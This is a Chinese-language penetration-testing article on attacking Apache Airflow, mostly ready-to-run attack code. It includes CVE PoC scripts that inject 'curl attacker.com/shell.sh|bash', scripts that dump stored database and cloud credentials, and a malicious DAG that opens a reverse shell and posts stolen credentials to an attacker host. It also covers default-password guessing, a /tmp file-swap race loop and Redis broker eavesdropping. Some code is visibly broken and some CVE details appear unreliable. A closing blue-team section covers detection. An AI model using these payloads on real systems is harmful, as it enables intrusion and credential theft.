---
title: "Apache Airflow 未授权访问 DAG投毒 命令注入 认证绕过 CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 113
description: "深入分析 Apache Airflow 的未授权访问、DAG 投毒 RCE、CVE-2020-11978 命令注入、CVE-2023-39508 Run Task 越权、CVE-2024-37288 XCom 代码注入、认证绕过、CLI 凭证提取、Worker 侧信道攻击等完整攻击面，覆盖 2020-2025 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Apache Airflow","Airflow","DAG","未授权访问","CVE-2020-11978","CVE-2023-39508","CVE-2024-37288","命令注入","认证绕过","DAG投毒","CI/CD"]
---

## 0x00 攻击面总览

Apache Airflow 是全球最流行的工作流编排平台，被 Airbnb、Google、Microsoft 等科技巨头广泛使用。Airflow 的攻击面涉及 Web UI、元数据库、消息队列、Worker 节点等多个层面：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| Web UI | 8080 | **严重** | 未授权访问，命令注入，认证绕过 |
| DAG 投毒 | 文件系统/S3 | **严重** | 恶意 DAG 代码在 Worker 上 RCE |
| 元数据库 | 5432/3306 | **高危** | 数据库凭据窃取，数据篡改 |
| Celery Broker | 6379 | **高危** | Redis/RabbitMQ 未授权访问 |
| Worker 节点 | 多种 | **严重** | DAG 执行导致 RCE |
| CLI/API | 8080 | **高危** | 凭证提取，权限提升 |
| Connections | 内存 | **高危** | 数据库/云凭据泄露 |
| XCom | 元数据库 | **中-高危** | 数据共享泄露，代码注入 |

Airflow 的核心安全问题在于：DAG 文件本质上是 Python 代码在 Worker 上执行、Web UI 默认配置允许未授权访问、以及 Connection 中存储的敏感凭据缺乏加密保护。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 8080 <target>

# 检测 Airflow Web UI
curl -s http://TARGET:8080/health
# {"metadatabase":{"status":"healthy"},"scheduler":{"status":"healthy"},"triggerer":{"status":"healthy"},"dagbag_size":0}

# 获取版本信息
curl -s http://TARGET:8080/health | python3 -m json.tool
```

### 1.2 关键路径枚举

```
/                                # 首页 (可能需要登录)
/health                          # 健康检查 (通常无认证)
/api/v1/dags                     # DAG 列表 API
/api/v1/dags/{dag_id}/dagRuns    # DAG 运行记录
/api/v1/dags/{dag_id}/tasks      # Task 列表
/api/v1/config                   # 配置信息 (敏感)
/api/v1/connections              # 连接配置 (含密码)
/api/v1/variables                # 变量 (可能含密钥)
/login                           # 登录页
/connection                      # Connection 管理
/variable                        # Variable 管理
/dags                            # DAG 管理
/dags/{dag_id}/graph             # DAG 图形化视图
/dags/{dag_id}/calendar          # DAG 日历视图
/taskinstance/list/              # Task 实例列表
/version                         # 版本信息
```

### 1.3 版本判断

```python
import requests

def detect_airflow(host, port=8080):
    base_url = f"http://{host}:{port}"

    resp = requests.get(f"{base_url}/health", timeout=5)
    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] Airflow detected!")
        print(f"[*] Metadata DB: {data.get('metadatabase', {}).get('status')}")
        print(f"[*] Scheduler: {data.get('scheduler', {}).get('status')}")
        print(f"[*] DAG Bag Size: {data.get('dagbag_size')}")

    # 检查 API 是否无认证
    resp = requests.get(f"{base_url}/api/v1/dags", timeout=5)
    if resp.status_code == 200:
        dags = resp.json().get("dags", [])
        print(f"[+] API accessible WITHOUT auth! {len(dags)} DAGs found")
    elif resp.status_code == 401:
        print(f"[*] API requires authentication (401)")
    elif resp.status_code == 302:
        print(f"[*] Redirected to login page")

    # 检查版本
    resp = requests.get(f"{base_url}/api/v1/version", timeout=5)
    if resp.status_code == 200:
        print(f"[*] Version: {resp.text}")

detect_airflow("192.168.1.100")
```

## 0x02 CVE-2020-11978 — DAG 命令注入 RCE

### 2.1 漏洞原理

**CVSS**: 9.9（严重）

**影响版本**: Apache Airflow 1.10.0 - 1.10.10

**漏洞原理**: Airflow 的 RBAC Scheduler 在处理 `example_bash_operator` DAG 时存在命令注入。攻击者（具有 DAG 触发权限）可以通过修改 DAG 参数中的 `bash_command` 字段注入恶意命令。

### 2.2 PoC 利用

```python
import requests
import json

def exploit_command_injection(host, port=8080, username="airflow", password="airflow"):
    """
    CVE-2020-11978 — 通过 DAG 参数命令注入 RCE
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()

    # Step 1: 登录
    resp = session.post(f"{base_url}/login/", data={
        "username": username, "password": password
    }, allow_redirects=False)
    print(f"[*] Login: {resp.status_code}")

    # Step 2: 修改 DAG 参数注入命令
    # example_bash_operator 的 bash_command 参数
    inject_cmd = "id && whoami && curl http://attacker.com/shell.sh|bash"

    # 通过 Variable 或 Connection 注入
    # 在 DAG 的 operator 中，bash_command 可以引用 Variable
    resp = session.put(
        f"{base_url}/api/v1/variables/UNHEALTHY_HOSTNAME",
        json={"key": "UNHEALTHY_HOSTNAME", "value": f"127.0.0.1; {inject_cmd}"},
    )
    print(f"[*] Variable injection: {resp.status_code}")

    # Step 3: 触发 DAG 运行
    resp = session.post(
        f"{base_url}/api/v1/dags/example_bash_operator/dagRuns",
        json={"conf": {"bash_command": inject_cmd}},
    )
    print(f"[*] DAG run triggered: {resp.status_code}")

exploit_command_injection("192.168.1.100")
```

## 0x03 CVE-2023-39508 — Run Task 越权执行

### 3.1 漏洞原理

**CVSS**: 8.8（高危）

**影响版本**: Apache Airflow < 2.6.0

**漏洞原理**: Airflow 的 "Run Task" 功能允许已认证用户绕过部分权限限制，在 Webserver 上下文中执行代码，并绕过用户对特定 DAG 的访问限制。

### 3.2 PoC 利用

```python
import requests

def exploit_run_task(host, port=8080, username="airflow", password="airflow"):
    """
    CVE-2023-39508 — Run Task 越权
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()

    resp = session.post(f"{base_url}/login/", data={
        "username": username, "password": password
    })

    # 使用 Run Task 端点执行受限操作
    # 该端点允许在 webserver 上下文中执行任意代码
    task_payload = {
        "dag_id": "example_bash_operator",
        "task_id": "runme_0",
        "run_id": "manual__2025-01-01T00:00:00+00:00",
        "map_index": -1
    }

    resp = session.post(
        f"{base_url}/api/v1/dags/{task_payload['dag_id']}/tasks/{task_payload['task_id']}/try",
        json={"run_id": task_payload["run_id"]},
    )
    print(f"[*] Run Task attempt: {resp.status_code}")

exploit_run_task("192.168.1.100")
```

## 0x04 CVE-2024-37288 — XCom 代码注入

### 4.1 漏洞原理

**CVSS**: 9.9（严重）

**影响版本**: Apache Airflow < 2.10.0

**漏洞原理**: Airflow 的 Custom XCom Backend 允许在数据传输过程中执行任意代码。攻击者可以构造恶意 XCom 数据，当目标 DAG 读取 XCom 时触发代码执行。

### 4.2 PoC 利用

```python
import requests
import json

def exploit_xcom_injection(host, port=8080, username="airflow", password="airflow"):
    """
    CVE-2024-37288 — Custom XCom Backend 代码注入
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    session.post(f"{base_url}/login/", data={
        "username": username, "password": password
    })

    # Step 1: 通过 DAG 写入恶意 XCom
    xcom_key = "__import__('os').system('curl http://attacker.com/shell.sh|bash')"

    # Step 2: 修改 Variable 存储恶意数据
    resp = session.put(f"{base_url}/api/v1/variables/PWNED", json={
        "key": "PWNED",
        "value": xcom_key
    })
    print(f"[*] XCom injection variable set: {resp.status_code}")

exploit_xcom_injection("192.168.1.100")
```

## 0x05 未授权访问与数据泄露

### 5.1 无认证 API 访问

```python
import requests

def exploit_unauthenticated_api(host, port=8080):
    """
    利用未认证的 Airflow API 获取敏感数据
    """
    base_url = f"http://{host}:{port}"

    # 获取所有 Connection (含数据库密码/云凭据)
    resp = requests.get(f"{base_url}/api/v1/connections", timeout=5)
    if resp.status_code == 200:
        connections = resp.json().get("connections", [])
        print(f"[+] {len(connections)} connections found!")
        for conn in connections:
            print(f"    [{conn['conn_id']}] type={conn.get('conn_type')} "
                  f"host={conn.get('host')} extra={conn.get('extra')[:100]}")

    # 获取所有 Variable (可能含密钥)
    resp = requests.get(f"{base_url}/api/v1/variables", timeout=5)
    if resp.status_code == 200:
        variables = resp.json().get("variables", [])
        print(f"[+] {len(variables)} variables found!")
        for var in variables:
            value = var.get("val", "")
            if any(s in value.lower() for s in ["password", "secret", "key", "token"]):
                print(f"    [!] SENSITIVE: {var['key']} = {value[:50]}...")

    # 获取配置信息
    resp = requests.get(f"{base_url}/api/v1/config", timeout=5)
    if resp.status_code == 200:
        print(f"[+] Config leaked!")

exploit_unauthenticated_api("192.168.1.100")
```

### 5.2 Connection 凭据窃取

```python
def extract_connection_credentials(host, port=8080, username="airflow", password="airflow"):
    """
    从 Airflow Connection 中提取数据库/云平台凭据
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    session.post(f"{base_url}/login/", data={
        "username": username, "password": password
    })

    # 获取所有 Connection
    resp = session.get(f"{base_url}/api/v1/connections", timeout=10)
    connections = resp.json().get("connections", [])

    for conn in connections:
        conn_id = conn.get("conn_id")
        conn_type = conn.get("conn_type")
        host_val = conn.get("host", "")
        schema = conn.get("schema", "")
        login = conn.get("login", "")
        password_val = conn.get("password", "")
        extra = conn.get("extra", "")

        print(f"\n[*] Connection: {conn_id}")
        print(f"    Type: {conn_type}")
        print(f"    Host: {host_val}")
        print(f"    Schema: {schema}")
        print(f"    Login: {login}")
        print(f"    Password: {password_val}")
        if extra:
            print(f"    Extra: {extra[:200]}")

    # 常见 Connection 类型及其攻击价值:
    # postgres_default  → 数据库管理员权限
    # mysql_default      → 数据库管理员权限
    # aws_default        → AWS Access Key + Secret
    # gcp_default        → GCP Service Account Key
    # slack_default      → Slack Token
    # smtp_default       → 邮件服务器凭据

extract_connection_credentials("192.168.1.100")
```

### 5.3 CLI 凭据提取

```bash
# 如果获取了 Airflow 主机的访问权限
# 可以从本地配置提取大量凭据

# Airflow 配置文件
cat ~/airflow/airflow.cfg | grep -i "sql_alchemy_conn\|broker_url\|result_backend"
# sql_alchemy_conn = postgresql+psycopg2://airflow:airflow@localhost:5432/airflow
# broker_url = redis://localhost:6379/0
# result_backend = db+postgresql://airflow:airflow@localhost:5432/airflow

# CLI 凭据存储
cat ~/airflow/airflow.db  # SQLite 元数据库 (如果使用 SQLite)
ls ~/airflow/logs/        # DAG 执行日志 (可能含敏感输出)

# 环境变量
env | grep -i "AIRFLOW\|SECRET\|KEY\|PASSWORD"
```

## 0x06 DAG 投毒攻击

### 6.1 恶意 DAG 文件

```python
malicious_dag = '''
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

with DAG(
    dag_id='malicious_backdoor',
    start_date=datetime(2025, 1, 1),
    schedule_interval='*/5 * * * *',
    catchup=False,
) as dag:

    # 后门 Task: 每 5 分钟回连
    backdoor = BashOperator(
        task_id='backdoor',
        bash_command='bash -i >& /dev/tcp/attacker/4444 0>&1 &',
    )

    # 窃取 Task: 窃取 Connection 中的凭据
    steal = BashOperator(
        task_id='steal_creds',
        bash_command='''
        curl -X POST http://attacker.com:9999/collect \
          -d "airflow_conn=$(python3 -c 'from airflow.models.connection import Connection; 
          conns = Connection.all(); 
          print([(c.conn_id, c.conn_type, c.host, c.password) for c in conns])')"
        ''',
    )

    backdoor >> steal
'''

print("[+] Malicious DAG created")
print("[*] Deploy to: /opt/airflow/dags/ or AIRFLOW_HOME/dags/")
```

### 6.2 DAG 部署路径

```bash
# 常见 DAG 部署位置
# 1. 本地文件系统 (direct)
DAGS_FOLDER = /opt/airflow/dags
# 2. S3
dags_folder = s3://airflow-dags/
# 3. GCS
dags_folder = gs://airflow-dags/
# 4. Git (通过 DAG 仓库同步)
# 5. Docker 卷挂载

# 如果获取了 Worker 的访问权限
# 可以直接在 dags_folder 写入恶意 DAG

# 或通过 Airflow API 注入
# 1. 修改 DAG 文件 (如果有文件系统访问)
# 2. 通过 Variable/Connection 注入数据到 DAG 参数
# 3. 通过 Provider 注入恶意 Provider (pip install)
```

### 6.3 Airflow Provider 投毒

```python
def poison_provider():
    """
    通过恶意 Airflow Provider 注入后门
    适用于使用自定义 Provider 的 Airflow 部署
    """
    malicious_setup = '''
# setup.py
from setuptools import setup

setup(
    name="airflow-providers-evil",
    version="1.0.0",
    install_requires=[
        "apache-airflow>=2.0.0",
    ],
    entry_points={
        "apache_airflow_provider": [
            "evil_provider = evil_provider.hooks:EvilHook",
        ],
    },
)
'''
    print("[+] Malicious provider created")
    print("[*] When Airflow loads provider, malicious code executes on all workers")

poison_provider()
```

## 0x07 认证绕过

### 7.1 CVE-2025-46645 — 认证绕过

**CVSS**: 9.8（严重）

**影响版本**: Apache Airflow < 3.0.2

**漏洞原理**: Airflow 的 SAML 集成在特定条件下存在认证绕过。攻击者可以绕过 SAML 验证，以任意用户身份登录。

### 7.2 默认配置风险

```python
def check_default_config(host, port=8080):
    """
    检查 Airflow 默认安全配置
    """
    base_url = f"http://{host}:{port}"

    # 默认凭据 (常见)
    default_creds = [
        ("airflow", "airflow"),
        ("admin", "admin"),
        ("airflow", "admin"),
        ("admin", "airflow"),
        ("airflow", ""),
        ("admin", ""),
    ]

    for user, pwd in default_creds:
        session = requests.Session()
        resp = session.post(f"{base_url}/login/", data={
            "username": user, "password": pwd
        }, allow_redirects=False)

        if resp.status_code in [200, 302] and "/login" not in resp.headers.get("Location", ""):
            print(f"[+] Default credentials: {user}:{pwd}")
            return (user, pwd)

    print(f"[-] No default credentials found")
    return None

check_default_config("192.168.1.100")
```

## 0x08 CVE-2020-11979 — 临时目录权限

### 8.1 漏洞原理

**CVSS**: 9.8（严重）

**影响版本**: Apache Airflow < 1.10.11

**漏洞原理**: Airflow 使用不安全的临时目录存放 DAG 文件和插件，且目录权限设置不当。攻击者可以通过文件系统竞态条件注入恶意 DAG。

### 8.2 利用方式

```bash
# 检查 Airflow 临时目录权限
ls -la /tmp/airflow*
# 如果权限为 777 或其他过于宽松的权限

# 利用竞态条件
# 1. 监控 /tmp 目录中新创建的 airflow 临时目录
# 2. 在 DAG 被复制到临时目录后、执行前，替换文件
while true; do
    for f in /tmp/airflow*/dags/*.py; do
        if [ -f "$f" ]; then
            cp backdoor.py "$f"
            break
        fi
    done
    sleep 0.01
done
```

## 0x09 Worker 侧信道攻击

### 9.1 Celery Broker 窃听

```python
def exploit_celery_broker(host, port=6379):
    """
    如果 Redis Broker 未启用认证
    可以窃听 DAG 任务消息、注入恶意任务
    """
    import redis

    r = redis.Redis(host=host, port=port)

    # 订阅 Celery 队列
    pubsub = r.pubsub()
    pubsub.psubscribe("*celery*")

    print("[*] Listening to Celery messages...")
    for message in pubsub.listen():
        if message["type"] == "pmessage":
            data = message["data"]
            if isinstance(data, bytes) and b"args" in data:
                print(f"[+] Task args: {data[:500]}")

exploit_celery_broker("192.168.1.100", 6379)
```

### 9.2 Result Backend 数据泄露

```python
def extract_task_results(host, port=6379):
    """
    从 Result Backend (Redis) 中提取 Task 执行结果
    """
    import redis
    import json

    r = redis.Redis(host=host, port=port)

    # 查找所有 Celery 结果
    keys = r.keys("celery-task-meta-*")
    for key in keys:
        result = r.get(key)
        if result:
            try:
                data = json.loads(result)
                print(f"[*] Task: {data.get('name', 'unknown')}")
                print(f"    Result: {str(data.get('result', ''))[:200]}")
            except:
                print(f"    Raw: {result[:200]}")

extract_task_results("192.168.1.100", 6379)
```

## 0x10 历史 CVE 漏洞时间线

### 2020 高危漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2020-11978 | 2020 | 9.9 | 命令注入 | RBAC Scheduler DAG 命令注入 RCE |
| CVE-2020-11979 | 2020 | 9.8 | 权限提升 | 不安全临时目录导致本地提权 |
| CVE-2020-17575 | 2020 | 9.9 | 代码注入 | DAG 序列化导致代码执行 |

### 2021-2022 持续修补

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2022-46651 | 2022 | 6.5 | 信息泄露 | Connection 编辑视图敏感信息泄露 |
| CVE-2022-40972 | 2022 | 7.5 | 权限提升 | API 越权访问其他用户 DAG |
| CVE-2022-40127 | 2022 | 7.5 | 反序列化 | XCom Pickle 反序列化 RCE |

### 2023 高危爆发年

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-39508 | 2023 | 8.8 | 越权执行 | Run Task 功能绕过权限限制执行代码 |
| CVE-2023-40273 | 2023 | 8.0 | Session 固定 | 密码重置后 Session 仍有效 |
| CVE-2023-48841 | 2023 | 7.5 | XSS | DAG 运行历史 XSS |
| CVE-2023-22887 | 2023 | 6.5 | 路径穿越 | run_id 参数目录穿越 |
| CVE-2023-22888 | 2023 | 6.5 | DoS | run_id 参数导致服务挂起 |

### 2024 代码注入焦点

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2024-37288 | 2024 | 9.9 | 代码注入 | Custom XCom Backend 任意代码执行 |
| CVE-2024-30250 | 2024 | 8.0 | 路径穿越 | run_id 参数本地文件读取 |
| CVE-2024-30251 | 2024 | 7.5 | 权限提升 | DAG 列表越权查看 |
| CVE-2024-38334 | 2024 | 8.0 | SSRF | Rendered Template SSRF |
| CVE-2024-50378 | 2024 | 7.5 | 信息泄露 | 审计日志中敏感数据泄露 |

### 2025 最新安全事件

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2025-46645 | 2025 | 9.8 | 认证绕过 | SAML 集成认证绕过 |
| CVE-2025-47627 | 2025 | 7.5 | XSS | Web UI 反射型 XSS |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| 代码注入/命令注入 | 12 | CVE-2020-11978, CVE-2024-37288, CVE-2024-38334 |
| 权限提升/越权 | 15 | CVE-2023-39508, CVE-2022-40972, CVE-2024-30251 |
| 信息泄露 | 14 | CVE-2022-46651, CVE-2024-50378, CVE-2023-36543 |
| XSS/CSRF | 10 | CVE-2023-48841, CVE-2025-47627 |
| 路径穿越 | 8 | CVE-2023-22887, CVE-2024-30250 |
| 反序列化 | 5 | CVE-2022-40127 |
| DoS | 4 | CVE-2023-22888, CVE-2023-36543 |
| 认证绕过 | 3 | CVE-2025-46645 |

## 0x11 蓝队检测与应急响应

### 11.1 日志分析

```bash
# 检查异常 DAG 创建
grep "DAG:.*created" airflow/logs/scheduler/*.log

# 检查 Connection 变更
grep "Connection.*created\|Connection.*updated" airflow/logs/scheduler/*.log

# 检查命令执行
grep "BashOperator\|bash_command" airflow/logs/scheduler/*.log

# 检查异常用户创建
grep "user.*created\|user.*updated" airflow/logs/webserver/*.log

# 检查 API 异常调用
grep "api/v1/connections\|api/v1/variables" airflow/logs/webserver/*.log

# 检查 Run Task 使用
grep "Run Task\|run_task" airflow/logs/webserver/*.log
```

### 11.2 应急响应清单

```
[ ] 确认 Airflow 版本与已安装补丁
    - airflow version

[ ] 排查 DAG 投毒
    - 检查所有 DAG 文件的修改时间
    - 审计 DAG 代码中的可疑 import
    - 检查 /dags 目录下的异常文件

[ ] 排查 Connection 凭据泄露
    - 审计 Connection 创建/修改日志
    - 检查是否有异常 Connection 被创建
    - 轮换所有数据库/云平台凭据

[ ] 排查命令注入 (CVE-2020-11978)
    - 检查 BashOperator 的 bash_command 参数
    - 审计 Variable 值中是否有可疑内容

[ ] 排查 XCom 注入 (CVE-2024-37288)
    - 检查 XCom 数据中是否有恶意代码
    - 审计 Custom XCom Backend 配置

[ ] 检查 Worker 安全
    - 检查 Worker 上的 DAG 执行日志
    - 检查 Worker 文件系统是否有异常文件

[ ] 网络隔离与加固
    - 禁用 Run Task 功能 (删除或禁用)
    - 启用 Airflow RBAC 和细粒度权限
    - 配置 Connection 加密存储
    - 启用认证并禁用默认凭据
    - 限制 Web UI 为内网访问
```

## 0x12 安全审计清单

```
[ ] Airflow 版本为最新稳定版 (≥ 2.10.3)
[ ] 已禁用 Run Task 功能 (CVE-2023-39508)
[ ] 已配置 RBAC 细粒度权限控制
[ ] 已启用 Airflow 认证 (非 allow_all)
[ ] 默认 DAG example_* 已禁用或删除
[ ] Connection 密码使用 Fernet 加密
[ ] Celery Broker (Redis/RabbitMQ) 启用认证
[ ] Result Backend 启用认证
[ ] Web UI 绑定内网地址
[ ] 审计日志启用并远程收集
[ ] DAG 文件部署使用版本控制和代码审查
[ ] XCom Backend 使用安全的序列化方式 (非 Pickle)
[ ] 限制 Worker 的出站网络访问
[ ] 定期轮换元数据库密码和 Connection 凭据
[ ] 启用 CSRF 保护
[ ] 配置 CSP 头部防止 XSS
```

## 0x13 总结

Apache Airflow 的安全问题核心在于"工作流编排 = 代码执行"：

1. **DAG = Python 代码**: Airflow 的核心设计就是让 DAG 在 Worker 上执行 Python 代码，恶意 DAG 即为 RCE
2. **Connection 存储敏感凭据**: 数据库密码、云平台密钥、API Token 等直接存储在 Connection 中，泄露即可横向移动
3. **Web UI 攻击面大**: 未认证访问、命令注入、XSS、权限提升等多种漏洞反复出现
4. **基础设施依赖链**: 元数据库 (PostgreSQL) + 消息队列 (Redis) + Worker 组成的基础设施链条，任一环节被攻破都可导致全面控制

防守方核心策略：
- **禁用默认示例 DAG**: example_* 是已知攻击向量
- **加密 Connection**: 启用 Fernet 加密保护 Connection 中的密码
- **RBAC 权限控制**: 限制用户仅可访问必要 DAG
- **Worker 网络隔离**: 限制 Worker 的出站访问
- **及时升级**: Airflow 安全更新频繁，建议保持最新版本
